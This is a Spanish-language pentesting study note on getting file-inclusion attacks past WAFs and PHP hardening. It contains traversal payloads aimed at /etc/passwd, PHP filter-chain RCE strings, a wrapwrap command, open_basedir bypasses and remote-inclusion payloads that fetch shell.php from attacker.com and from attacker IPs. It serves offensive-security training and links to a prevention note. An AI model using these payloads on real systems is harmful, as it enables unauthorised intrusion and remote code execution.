---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - File-Inclusion
Fecha de actualización: 2026-06-22
Nota previa: "[[08 - Detección y fuzzing automatizado]]"
Nota siguiente: "[[10 - Prevención de File Inclusion]]"
Area: "[[File Inclusion.base|File Inclusion]]"
---
---

Los [[02 - Bypasses básicos - traversal, null byte y encoding|bypasses básicos]] esquivan el filtro que la propia app escribe en su código. En un objetivo real hay dos capas más: un **WAF** delante inspeccionando cada petición, y el **hardening de PHP** detrás (`allow_url_include`, `open_basedir`). La evasión aquí es de otra naturaleza, y es lo que separa un PoC de laboratorio de un hallazgo en producción.

# Encoding contra el WAF (no contra la app)

Aunque la app no filtre nada, el WAF marca `../` y `/etc/passwd` por firma. El objetivo del encoding cambia: ya no es burlar un `str_replace`, sino que el payload **no coincida con la regla del WAF pero sí se decodifique en el backend**. Estado real de cada técnica en 2026:

| Técnica | Payload | Estado frente a WAF |
| - | - | - |
| Doble URL-encode | `..%252f..%252fetc%252fpasswd` | <mark style="background: #FFB8EBA6;">Vivo</mark> si el WAF decodifica una vez y el backend dos |
| `....//` | `....//....//etc/passwd` | El CRS `930110` lo detecta; útil aún contra WAFs flojos |
| UTF-8 overlong | `%c0%ae` (`.`) | **Muerto** — los parsers modernos lo rechazan (RFC 3629) |
| Unicode fullwidth | `%uff0e%uff0e%u2215` | Situacional — normalización `NFKC` tardía en algunas libs .NET/Go |
| Backslash Windows | `..\..\..\windows\win.ini` | Vivo en IIS/Windows si el filtro es *Linux-céntrico* |
| Null byte / truncation | `...%00.php` | **Muerto** en PHP ≥ 5.3.4 |

<mark style="background: #FF5582A6;">Detecta primero el WAF</mark> (`wafw00f`, parte del [[09 - Fingerprinting web|fingerprinting]]) y adapta la huella de la petición a partir de ahí.

# Las reglas del OWASP CRS y cómo caen

`ModSecurity` con el OWASP Core Rule Set es el WAF de referencia. Las reglas que disparan en file inclusion:

- **`930100`** — traversal URL-encodeado (`%2e%2e%2f`).
- **`930110`** — traversal decodificado y backslash (`..\..\`).
- **`930120`** — blacklist de ficheros sensibles (`/etc/passwd`, `win.ini`, `.htaccess`).

Vías de evasión documentadas:

- **Doble encoding** (`%252f`): el WAF decodifica una vez y no ve el `../`; el backend decodifica de nuevo y sí lo resuelve.
- **Path confusion**: un sufijo o separador que el WAF y el backend interpreten distinto (`%3F`, `%23`, `;`) hace que el WAF normalice la ruta de forma diferente al servidor. Muy dependiente del par WAF/servidor —pruébalo, no es universal—.
- **CVE-2024-1019** — ModSecurity v3.0.0–v3.0.11: confusión en la decodificación de URL antes de separar path y query string permitía evadir la detección de traversal. Parcheado en **v3.0.12**; útil contra instalaciones sin actualizar.
- **Cuerpo sobredimensionado**: algunos planes de Cloudflare no inspeccionan cuerpos `> 128 KiB`; rellenar antes del payload puede colarlo.

# Filter chains: la evasión de keywords definitiva

Cuando el WAF bloquea las cadenas literales (`/etc/passwd`, `../`, `system`, `include`), las [[04 - PHP wrappers II - RCE y filter chains|filter chains]] son la mejor respuesta. <mark style="background: #ADCCFFA6;">La cadena `php://filter/convert.iconv...` genera el código PHP arbitrario sin que ninguna palabra prohibida aparezca en el payload</mark> — solo nombres de filtros `iconv` y `base64`:

```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|resource=php://temp
```

Ni `system` ni `../` ni `/etc/passwd` viajan en claro: el WAF no tiene firma que disparar. Por eso, frente a un WAF de keywords, suele ser la única vía a RCE — y la misma primitiva en modo [[08 - Detección y fuzzing automatizado|oracle]] permite leer ficheros a ciegas.

# `wrapwrap`: moldear el contenido al sink

A veces el problema no es el WAF sino que la app **procesa** lo incluido: lo parsea como JSON o como plantilla, y un `/etc/passwd` crudo rompe el parser antes de ejecutarse. [`wrapwrap`](https://github.com/ambionics/wrapwrap) (Ambionics, Charles Fol) genera una cadena `php://filter` que **antepone y añade datos arbitrarios** al contenido del fichero incluido:

```shell-session
$ python3 wrapwrap.py /etc/passwd '{"file":"' '"}' 2048
```

Así el contenido sale envuelto en `{"file":"...root:x:0:0:..."}`, el parser JSON lo acepta y el flujo continúa. <mark style="background: #8000E1A6;">Convierte un sink "imposible" (que exige un formato concreto) en explotable</mark>. El payload crece mucho (envolver ~3 KB ≈ 2 MB), así que se envía por `POST`.

# RFI cuando bloquean el esquema

Si el WAF filtra `http://`, las vías alternativas (mecánica completa en [[05 - Remote File Inclusion (RFI)|RFI]]):

```
ftp://attacker.com/shell.php                 # otro esquema
\\10.10.14.5\share\shell.php                 # SMB UNC (Windows)
http://168430085/shell.php                   # IP en decimal (10.10.14.5)
http://0x0A0A0E05/shell.php                  # IP en hexadecimal
data://text/plain;base64,PD9waHA...          # sin alojar fichero (si allow_url_include=On)
```

# Restricciones de servidor: `allow_url_include` y `open_basedir`

Las defensas de configuración también se sortean:

- **`allow_url_include = Off`** (por defecto desde PHP 7.4) mata la RFI por `http://`/`ftp://`. Pero <mark style="background: #FFB86CA6;">en Windows, la inclusión por ruta UNC SMB (`\\host\share\file.php`) **no** necesita esa directiva</mark>: PHP delega en el SO, que trata la UNC como un fichero local. Es uno de los bypasses más infravalorados.
- **`open_basedir`** restringe a qué rutas accede PHP. No es una barrera fiable si ya tienes ejecución PHP: se ha sorteado con `glob://` y comodines (bug antiguo, mayormente parcheado), con `ini_set('open_basedir', ...)` en runtime para ampliar el directorio base, con `.htaccess` (`php_value open_basedir`) en Apache+`mod_php` si hay escritura en el webroot, o vía inyección de parámetros FastCGI (`PHP_VALUE`) si un proxy delante de PHP-FPM no los filtra. <mark style="background: #8000E1A6;">Trátalo como *defense-in-depth*, no como un muro</mark>.

> [!warning]+ La evasión no convierte un "no vulnerable" en vulnerable
> Estas técnicas sortean **defensas**, no crean la vulnerabilidad. Si el sink no es alcanzable o no ejecuta, ninguna evasión ayuda. Y aplican rate-limiting/baneo: el [[27 - Evasión en recon y fuzzing|ritmo y la huella]] de tus peticiones importan tanto como el payload.

> [!info]+ Fuentes
> - [Synacktiv — PHP filter chains](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it.html) · [Ambionics — wrapwrap](https://github.com/ambionics/wrapwrap)
> - [OWASP CRS](https://coreruleset.org/) · [CVE-2024-1019 (ModSecurity)](https://nvd.nist.gov/vuln/detail/CVE-2024-1019)
> - [r3d-buck3t — RFI con SMB](https://medium.com/r3d-buck3t/exploiting-remote-file-inclusion-with-smb-963aec325908) · [PHP — `open_basedir`](https://www.php.net/manual/en/ini.core.php#ini.open-basedir)

Cubierta la explotación, la evasión y la detección, cierra el ciclo la defensa: cómo se **previene** una file inclusion en código y configuración: [[10 - Prevención de File Inclusion]].
